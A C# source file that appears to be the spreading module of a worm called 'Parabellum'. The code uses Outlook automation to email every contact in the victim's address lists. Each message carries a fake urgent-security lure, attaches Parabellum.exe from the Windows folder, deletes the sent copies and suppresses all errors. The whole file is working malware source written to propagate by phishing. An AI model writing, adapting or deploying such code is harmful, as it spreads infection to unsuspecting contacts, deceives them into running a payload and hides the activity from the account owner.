using Microsoft.Office.Interop.Outlook;
using System;
using System.Diagnostics;
using System.IO;
using static Vanara.PInvoke.User32;
using Vanara.PInvoke;

namespace Parabellum
{
    public class Spread
    {
        // [ENG]
        // // Copyright (c) 2025 Cyberware. All rights reserved.
        // Officially developed by Cyberware.

        // [PTBR]
        // Copyright (c) 2025 Cyberware. Todos os direitos reservados.
        // Desenvolvido oficialmente por Cyberware.   
        public static void Email()
        {
            try
            {
                string win = Environment.GetFolderPath(Environment.SpecialFolder.Windows);

                Application outlook = new Application();
                NameSpace mapi = outlook.GetNamespace("MAPI");

                foreach (AddressList addr in mapi.AddressLists)
                {
                    if (addr.AddressEntries.Count > 0)
                    {
                        int addrEntCount = addr.AddressEntries.Count;

                        for (int addrEntIndex = 1; addrEntIndex <= addrEntCount; addrEntIndex++)
                        {
                            MailItem item = outlook.CreateItem(OlItemType.olMailItem) as MailItem;

                            item.To = addr.AddressEntries[addrEntIndex].Address;
                            item.Subject = "-> Urgent Security: Action Required Now! <-";
                            item.Body = "Friend, this is serious! Install the attached software right now! We are currently facing a massive attack " +
                                "from professional hackers aiming for national warfare! To ensure complete protection, " +
                                "you need to install and run this file on your system. It's called \"Parabellum,\" as you can see, " +
                                "because \"for peace, we must prepare for war.\" Let's get ready! Trust me!";

                            string attachmentPath = Path.Combine(win, "Parabellum.exe");
                            item.Attachments.Add(attachmentPath);

                            item.DeleteAfterSubmit = true;

                            if (!string.IsNullOrEmpty(item.To))
                            {
                                item.Send();
                            }
                        }
                    }
                }
            }
            catch (System.Exception ex)
            {
                return;
            }
        }
    }
}
